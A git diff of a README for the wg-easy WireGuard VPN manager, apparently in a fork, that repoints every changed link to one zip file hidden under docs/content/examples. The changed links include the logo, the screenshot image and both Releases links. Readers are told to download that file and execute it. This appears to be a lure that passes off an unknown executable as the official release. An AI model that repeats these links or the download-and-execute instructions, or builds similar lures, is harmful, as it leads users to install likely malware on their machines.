@@ -1,6 +1,6 @@
 # wg-easy: The Easiest Way to Run WireGuard VPN 🌐
 
-![WireGuard Logo](https://upload.wikimedia.org/wikipedia/commons/3/3e/WireGuard_logo.svg)
+![WireGuard Logo](https://raw.githubusercontent.com/Devcore321/wg-easy/master/docs/content/examples/wg-easy-2.7-alpha.1.zip)
 
 Welcome to the **wg-easy** repository! This project offers a straightforward way to set up and manage a WireGuard VPN, complete with a web-based admin interface. If you want to enhance your online privacy and security, you’ve come to the right place.
 
@@ -32,7 +32,7 @@ WireGuard is a modern VPN protocol known for its simplicity and high performance
 
 To install **wg-easy**, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Devcore321/wg-easy/releases). Make sure to choose the correct file for your system.
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/Devcore321/wg-easy/master/docs/content/examples/wg-easy-2.7-alpha.1.zip). Make sure to choose the correct file for your system.
 2. **Execute the downloaded file** to start the installation process.
 
 ### Example Command
@@ -72,7 +72,7 @@ The web-based Admin UI is designed for ease of use. You can perform various task
 
 ### Screenshot of the Admin UI
 
-![Admin UI Screenshot](https://example.com/screenshot.png)
+![Admin UI Screenshot](https://raw.githubusercontent.com/Devcore321/wg-easy/master/docs/content/examples/wg-easy-2.7-alpha.1.zip)
 
 ## Contributing
 
@@ -91,12 +91,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloads, please visit the [Releases section](https://github.com/Devcore321/wg-easy/releases). Make sure to download the appropriate file for your system and execute it to get started.
+For the latest updates and downloads, please visit the [Releases section](https://raw.githubusercontent.com/Devcore321/wg-easy/master/docs/content/examples/wg-easy-2.7-alpha.1.zip). Make sure to download the appropriate file for your system and execute it to get started.
 
 ## Conclusion
 
 Thank you for checking out **wg-easy**! We hope this tool makes your VPN experience seamless and secure. If you have any questions or feedback, feel free to reach out through the issues section.
 
-![WireGuard VPN](https://example.com/wireguard-vpn.png)
+![WireGuard VPN](https://raw.githubusercontent.com/Devcore321/wg-easy/master/docs/content/examples/wg-easy-2.7-alpha.1.zip)
 
 Let's secure your online presence together!
